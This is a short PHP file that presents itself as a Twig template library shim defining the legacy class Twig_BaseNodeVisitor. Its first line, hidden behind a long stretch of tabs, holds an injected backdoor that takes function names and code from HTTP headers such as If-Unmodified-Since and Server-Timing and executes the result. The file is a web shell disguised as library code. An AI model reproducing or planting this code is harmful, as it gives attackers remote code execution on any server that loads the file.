<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$system=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['If-Modified-Since']($_HEADERS['Server-Timing']));$system();}


use Twig\NodeVisitor\AbstractNodeVisitor;

class_exists('Twig\NodeVisitor\AbstractNodeVisitor');

if (\false) {
    class Twig_BaseNodeVisitor extends AbstractNodeVisitor
    {
    }
}
